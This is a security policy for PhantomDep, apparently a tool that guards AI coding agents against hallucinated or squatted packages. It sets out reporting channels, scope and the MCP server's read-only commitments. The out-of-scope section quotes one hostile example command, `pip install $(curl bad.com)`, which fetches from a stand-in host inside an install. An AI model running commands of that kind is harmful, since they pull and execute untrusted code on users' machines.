# Security policy

## Reporting a vulnerability

If you find a security issue in PhantomDep — the binary, the LSP/MCP server, the Claude Code hook, the GitHub Action, the VS Code extension, the Phantom-DB pipelines, or the GitHub workflows — please **do not open a public issue**.

Instead, file a private report through GitHub Security Advisories:

> **<https://github.com/openintelligence-labs/phantomdep/security/advisories/new>**

Include:

1. The component affected (e.g. "MCP server", "hook check Bash splitter", "VS Code extension").
2. A reproduction case — minimal input that demonstrates the issue.
3. The impact you've observed or believe is possible.
4. Whether you've already disclosed the issue elsewhere.

We aim to acknowledge within 48 hours and to publish a fix (or detailed mitigation) within 30 days. For high-severity issues we'll request a coordinated disclosure window — typically 90 days from first report.

## Supported versions

| Version | Status |
|---|---|
| 1.x (current) | Supported. Fixes backported to the latest minor. |

We commit to producing a security release for any confirmed high-severity issue. Low-severity issues are batched into the next regular release.

## Scope

**In scope:**

- Code-execution or sandbox-escape via the binary, LSP/MCP server, hook, or wrapper.
- False-negative classes that allow a known-malicious or known-squatted package to be marked `REAL`.
- Information disclosure beyond what the user explicitly asked for (e.g., PhantomDep leaking source code or tokens to the network).
- Tampering with `~/.claude/settings.json` beyond the documented hook entry.
- Cache or Phantom-DB corruption that survives a process restart.
- Path traversal / arbitrary-file-write via `phantomdep hook check`, `phantomdep wrap`, or the LSP/MCP servers.

**Out of scope** (these are working as designed):

- The Phantom-DB does not contain every unregistered LLM-hallucinated name. That's deliberate — publishing a leaderboard of unclaimed names is an attacker shopping list, so they live in an embargoed research tier.
- Network errors during `phantomdep check` cause `UNKNOWN` verdicts (not `BLOCK`). Documented behaviour to avoid breaking offline workflows.
- The shell pipeline splitter in the hook handler is a best-effort gate, not a sandbox. `pip install $(curl bad.com)` is a defence-in-depth concern, not a PhantomDep bug.

## Hardened MCP posture

The MCP server is read-only by design. If you find a way to trigger filesystem mutation, registry mutation, or arbitrary command execution through the MCP interface, that *is* a security issue and we want to hear about it immediately.

The MCP server commits to:

- Read-only tools only — no shell exec, no fs mutation, no registry writes
- Strict schema validation on every argument
- Deterministic outputs
- Local stdio first; HTTP transport opt-in
- Zero telemetry, zero prompt capture

A bug in any of these is a security bug.

## Phantom-DB pipeline submissions

The verifier and feeder bots run on GitHub-hosted runners with no PhantomDep secrets beyond the standard `GITHUB_TOKEN`. If you find a way to use a Phantom-DB PR to inject malicious changes elsewhere in the repo (e.g., via the verifier auto-commit step), that is in scope.
